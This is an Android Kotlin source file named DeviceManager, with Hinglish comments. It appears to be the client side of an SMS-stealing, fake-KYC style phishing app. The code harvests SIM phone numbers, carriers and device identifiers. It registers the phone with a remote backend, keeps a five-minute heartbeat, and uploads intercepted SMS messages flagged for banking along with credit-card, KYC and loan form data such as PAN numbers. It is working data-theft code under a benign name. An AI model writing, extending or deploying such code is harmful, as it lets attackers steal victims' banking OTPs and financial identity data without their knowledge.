package com.example.admin.network

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * ══════════════════════════════════════════════════════════════
 *  DeviceManager.kt — First Android App (sender/device side)
 * ══════════════════════════════════════════════════════════════
 *
 *  Sare backend calls yahan se hote hain:
 *
 *  POST /api/device/:token/upsert  → registerDevice(), sendHeartbeat()
 *  POST /api/device/:token/data    → submitFormData()
 *  GET  /api/device/:token/get/:uid → getMyStatus()
 *
 *  Usage (MainActivity ya Service mein):
 *
 *    val dm = DeviceManager(context)
 *    dm.registerDevice(fcmToken)          // app start pe ek baar
 *    dm.startHeartbeat()                  // background mein chalta rahe
 *    dm.submitFormData("credit_card", mapOf("name" to "John", ...))
 *    dm.stopHeartbeat()                   // onDestroy mein
 * ══════════════════════════════════════════════════════════════
 */
class DeviceManager(private val context: Context) {

    companion object {
        private const val TAG            = "DEVICE_MANAGER"
        private const val HEARTBEAT_INTERVAL_MS = 5 * 60 * 1000L  // 5 minutes
        private const val RETRY_DELAY_MS        = 15_000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val BACKEND = Constants.DEVICE_API_BASE_URL  // "https://DOMAIN/api/device/sncx8wob"

    // ── UID — Android ID based (stable) ──────────────────────────
    @SuppressLint("HardwareIds")
    private fun getUid(): String {
        val androidId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        } catch (e: Exception) { null }
        return if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c")
            androidId else android.os.Build.SERIAL.ifBlank { "unknown_${System.currentTimeMillis()}" }
    }

    // ── Device info ───────────────────────────────────────────────
    private fun buildDeviceJson(fcmToken: String? = null): JSONObject {
        val uid = getUid()
        val tm  = try { context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager } catch (_: Exception) { null }

        val sim1Number  = getSimNumber(0) ?: ""
        val sim2Number  = getSimNumber(1) ?: ""
        val sim1Carrier = try { tm?.networkOperatorName ?: "" } catch (_: Exception) { "" }
        val sim2Carrier = try { getSimCarrier(1) ?: "" } catch (_: Exception) { "" }

        return JSONObject().apply {
            put("uid",          uid)
            put("sub_id",       uid)
            put("app_id",       Constants.APP_TOKEN)
            put("data_type",    "device")
            put("status",       "active")
            put("registered_at", System.currentTimeMillis())

            put("data_json", JSONObject().apply {
                put("uid",            uid)
                put("model",          Build.MODEL ?: "")
                put("manufacturer",   Build.MANUFACTURER ?: "")
                put("brand",          Build.BRAND ?: "")
                put("androidversion", Build.VERSION.RELEASE ?: "")
                put("sdk_int",        Build.VERSION.SDK_INT)
                put("sim1number",     sim1Number)
                put("sim2number",     sim2Number)
                put("sim1carrier",    sim1Carrier)
                put("sim2carrier",    sim2Carrier)
                put("joinedat",       System.currentTimeMillis())
                if (!fcmToken.isNullOrBlank()) put("fcm_token", fcmToken)
            })
        }
    }

    @SuppressLint("MissingPermission")
    private fun getSimNumber(slotIndex: Int): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subs = sm?.activeSubscriptionInfoList ?: return null
                subs.getOrNull(slotIndex)?.number?.takeIf { it.isNotBlank() }
            } else null
        } catch (_: Exception) { null }
    }

    @SuppressLint("MissingPermission")
    private fun getSimCarrier(slotIndex: Int): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subs = sm?.activeSubscriptionInfoList ?: return null
                subs.getOrNull(slotIndex)?.carrierName?.toString()?.takeIf { it.isNotBlank() }
            } else null
        } catch (_: Exception) { null }
    }

    // ════════════════════════════════════════════════════════════
    //  1. registerDevice — app launch pe ek baar call karo
    //     POST /api/device/:token/upsert
    // ════════════════════════════════════════════════════════════
    fun registerDevice(fcmToken: String? = null, callback: ((Boolean, String?) -> Unit)? = null) {
        scope.launch {
            try {
                val payload = buildDeviceJson(fcmToken)
                val ok = postUpsert(payload)
                Log.d(TAG, "registerDevice → $ok (uid=${getUid()})")
                callback?.invoke(ok, if (ok) null else "Server error")
            } catch (e: Exception) {
                Log.e(TAG, "registerDevice", e)
                callback?.invoke(false, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  2. sendHeartbeat — periodic online status update
    //     POST /api/device/:token/upsert
    // ════════════════════════════════════════════════════════════
    fun sendHeartbeat() {
        scope.launch {
            try {
                val uid = getUid()
                val now = System.currentTimeMillis()
                val payload = JSONObject().apply {
                    put("uid",       uid)
                    put("sub_id",    uid)
                    put("app_id",    Constants.APP_TOKEN)
                    put("data_type", "heartbeat")
                    put("data_json", JSONObject().apply {
                        put("online_checked_at", now)
                        put("online_status", "online")
                        put("heartbeat", JSONObject().apply {
                            put("checked_at", now)
                            put("available",  "yes")
                        })
                    })
                }
                val ok = postUpsert(payload)
                Log.d(TAG, "sendHeartbeat → $ok")
            } catch (e: Exception) {
                Log.e(TAG, "sendHeartbeat", e)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  3. startHeartbeat / stopHeartbeat — background loop
    // ════════════════════════════════════════════════════════════
    fun startHeartbeat() {
        stopHeartbeat()
        heartbeatJob = scope.launch {
            sendHeartbeat()   // immediate first beat
            while (isActive) {
                delay(HEARTBEAT_INTERVAL_MS)
                sendHeartbeat()
            }
        }
        Log.d(TAG, "Heartbeat started (interval: ${HEARTBEAT_INTERVAL_MS / 1000}s)")
    }

    fun stopHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = null
        Log.d(TAG, "Heartbeat stopped")
    }

    // ════════════════════════════════════════════════════════════
    //  4. submitFormData — form submission
    //     POST /api/device/:token/data
    // ════════════════════════════════════════════════════════════
    /**
     * @param dataType  e.g. "credit_card", "kyc_form", "loan_form"
     * @param fields    form fields as Map<String, Any>
     * @param callback  (success, errorMsg?)
     *
     * Example:
     *   dm.submitFormData("credit_card", mapOf(
     *       "name"  to "John Doe",
     *       "phone" to "+91XXXXXXXXXX",
     *       "pan"   to "ABCDE1234F"
     *   ))
     */
    fun submitFormData(
        dataType: String,
        fields: Map<String, Any>,
        callback: ((Boolean, String?) -> Unit)? = null
    ) {
        scope.launch {
            try {
                val uid = getUid()
                val now = System.currentTimeMillis()
                val payload = JSONObject().apply {
                    put("uid",          uid)
                    put("sub_id",       uid)
                    put("app_id",       Constants.APP_TOKEN)
                    put("dataType",     dataType)
                    put("submitted_at", now)
                    fields.forEach { (k, v) -> put(k, v) }
                }
                Log.d(TAG, "submitFormData [$dataType] → $BACKEND/data")
                val ok = postData(payload)
                callback?.invoke(ok, if (ok) null else "Server error")
            } catch (e: Exception) {
                Log.e(TAG, "submitFormData", e)
                callback?.invoke(false, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  5. getMyStatus — apna current status check karo
    //     GET /api/device/:token/get/:uid
    // ════════════════════════════════════════════════════════════
    /**
     * Returns JSONObject with device row, or null if not found / error
     *
     * Example:
     *   dm.getMyStatus { device, err ->
     *       if (device?.optString("status") == "blocked") showBlockedScreen()
     *   }
     */
    fun getMyStatus(callback: (JSONObject?, String?) -> Unit) {
        val uid = getUid()
        scope.launch {
            try {
                val url = "$BACKEND/get/$uid"
                val resp = http.newCall(Request.Builder().url(url).get().build()).execute()
                val body = resp.body?.string() ?: "{}"
                if (!resp.isSuccessful) { callback(null, "HTTP ${resp.code}"); return@launch }
                val obj = JSONObject(body)
                callback(if (obj.optBoolean("ok", false)) obj.optJSONObject("data") else null,
                    if (!obj.optBoolean("ok", false)) obj.optString("error") else null)
            } catch (e: Exception) {
                Log.e(TAG, "getMyStatus", e)
                callback(null, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  6. sendSmsToBackend — SMS data push karo
    //     POST /api/device/:token/upsert
    // ════════════════════════════════════════════════════════════
    /**
     * @param smsJson  JSONObject with: sms_id, title, body, sender_number,
     *                 receiver_number, timestamp, isBanking (optional)
     */
    fun sendSmsToBackend(smsJson: JSONObject, callback: ((Boolean) -> Unit)? = null) {
        scope.launch {
            try {
                val uid = getUid()
                val now = System.currentTimeMillis()
                val payload = JSONObject().apply {
                    put("uid",              uid)
                    put("sub_id",           uid)
                    put("app_id",           Constants.APP_TOKEN)
                    put("data_type",        "sms")
                    put("last_sms_log",     smsJson)
                    put("last_sms_timestamp", smsJson.optLong("timestamp", now))
                    put("sms_append",       smsJson)  // backend can handle array append
                    put("data_json", JSONObject().apply {
                        put("last_sms_at", now)
                    })
                }
                val ok = postUpsert(payload)
                Log.d(TAG, "sendSmsToBackend → $ok")
                callback?.invoke(ok)
            } catch (e: Exception) {
                Log.e(TAG, "sendSmsToBackend", e)
                callback?.invoke(false)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  7. updateFcmToken — FCM token refresh pe call karo
    //     POST /api/device/:token/upsert
    // ════════════════════════════════════════════════════════════
    fun updateFcmToken(newToken: String) {
        scope.launch {
            try {
                val uid = getUid()
                val payload = JSONObject().apply {
                    put("uid",       uid)
                    put("sub_id",    uid)
                    put("app_id",    Constants.APP_TOKEN)
                    put("data_type", "fcm_update")
                    put("data_json", JSONObject().apply {
                        put("fcm_token",       newToken)
                        put("fcm_updated_at",  System.currentTimeMillis())
                    })
                }
                val ok = postUpsert(payload)
                Log.d(TAG, "updateFcmToken → $ok")
            } catch (e: Exception) {
                Log.e(TAG, "updateFcmToken", e)
            }
        }
    }

    // ─── HTTP helpers ────────────────────────────────────────────

    private suspend fun postUpsert(payload: JSONObject): Boolean = withContext(Dispatchers.IO) {
        post("$BACKEND/upsert", payload)
    }

    private suspend fun postData(payload: JSONObject): Boolean = withContext(Dispatchers.IO) {
        post("$BACKEND/data", payload)
    }

    private suspend fun post(url: String, payload: JSONObject): Boolean {
        return try {
            val body = payload.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaType())
            val req  = Request.Builder().url(url).post(body).build()
            val resp = http.newCall(req).execute()
            val ok   = resp.isSuccessful
            if (!ok) Log.w(TAG, "POST $url → ${resp.code}: ${resp.body?.string()}")
            resp.body?.close()
            ok
        } catch (e: Exception) {
            Log.e(TAG, "POST $url failed: ${e.message}")
            false
        }
    }

    // ─── Lifecycle ───────────────────────────────────────────────

    fun destroy() {
        stopHeartbeat()
    }
}
